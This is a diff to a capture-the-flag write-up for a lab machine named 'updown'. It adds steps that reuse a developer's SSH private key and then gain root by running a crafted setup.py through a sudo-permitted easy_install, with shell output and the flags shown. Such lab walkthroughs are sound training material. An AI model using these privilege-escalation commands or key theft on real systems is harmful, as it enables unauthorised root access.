@@ -451,13 +451,35 @@ whoami
 developer
 ```
 
-As this exploit rasied my uid to 1002(developer) but left my gid as 33(www-data), I still couldn't read user.txt (as it was owned by root). To get around this, I simply read the id_rsa file in `/home/developer/.ssh/` and then used SSH to connect back to the server on a stable shell.
+As this exploit rasied my uid to 1002(developer) but left my gid as 33(www-data), I still couldn't read user.txt (as it was owned by root). To get around this, I simply read the id_rsa file in `/home/developer/.ssh/` and then used SSH to connect back to the server on a stable shell and read `user.txt`.
 ```
 └──╼ $ssh -i dev_id_rsa developer@10.10.11.177
 developer@updown:~$ cat user.txt
 821fdd4a950f1c09894302d6d6a5cb97
 ```
 
-
-
 # Solving root.txt
+One of the first things I do once I have user permissions is check what sudo privileges we have. In this case, it shows that we have root access to the `easy_install` binary.
+```
+developer@updown:~$ sudo -l
+Matching Defaults entries for developer on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User developer may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/local/bin/easy_install
+```
+
+Checking [GTFObins](https://gtfobins.github.io/), it can easily be found that `easy_install` is exploitable for privilege escalation.
+```
+developer@updown:~$ TF=$(mktemp -d)
+developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+developer@updown:~$ sudo easy_install $TF
+WARNING: The easy_install command is deprecated and will be removed in a future version.
+Processing tmp.ThHqdha4mt
+Writing /tmp/tmp.ThHqdha4mt/setup.cfg
+Running setup.py -q bdist_egg --dist-dir /tmp/tmp.ThHqdha4mt/egg-dist-tmp-TS9tsy
+# whoami
+root
+# cd /root && cat root.txt
+49de4f1d0c98773ad67100ab2cc65634
+```
